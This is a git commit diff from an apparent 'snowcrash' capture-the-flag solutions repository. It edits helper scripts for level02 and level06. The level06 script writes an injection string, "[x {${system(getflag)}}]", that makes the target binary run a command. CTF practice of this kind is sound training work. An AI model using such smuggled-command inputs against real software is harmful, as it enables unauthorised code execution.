1613b08aa76330322f556cda6d49d48b9352d01e
Valentin CHAILLOU <vchaillo@e3r3p19.42.fr>
2016-08-10 22:59:24 +0200

    add explainations for level06 and level07

--- level02/Ressources/level02.sh
+++ level02/Ressources/level02.sh
@@ -2,5 +2,3 @@ echo -n "Please enter snowcrash vm's IP address : "
 read ip
 scp -P 4242 level02@$ip:/home/user/level02/level02.pcap .
 chmod +rw level02.pcap
-# brew install wireshark
-# wireshar level02.pcap
--- level06/Ressources/level06.sh
+++ level06/Ressources/level06.sh
@@ -1,3 +1,2 @@
-#!/bin/sh
 echo "[x {\${system(getflag)}}]" > /tmp/level06.txt
 /home/user/level06/level06 /tmp/level06.txt 2> /dev/null
